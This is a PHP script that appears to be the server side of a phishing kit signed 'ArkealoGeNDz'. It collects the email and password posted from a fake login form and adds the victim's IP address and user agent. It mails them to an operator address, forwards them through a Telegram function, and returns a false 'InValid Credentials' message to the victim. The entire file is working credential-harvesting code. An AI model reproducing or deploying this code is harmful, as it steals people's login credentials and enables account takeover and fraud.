<?php
include 'api.php';
$email = filter_var(trim($_POST['email']), FILTER_SANITIZE_EMAIL);
$password = htmlspecialchars(trim($_POST['password']));
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message = "|----------| ArkealoGeNDz |--------------|\n";
	
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- ArkealoGeNDz --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	$headers = 'From: executive@foneunits.com'       . "\r\n" .
                 'Reply-To: executive@foneunits.com' . "\r\n" .
                 'X-Mailer: PHP/' . phpversion();
    mail($send, $subject, $message,$headers);   
    send_telegram_msg($message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
function get_client_ip() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}
$ip = get_client_ip(); // Appel de la fonction
?>
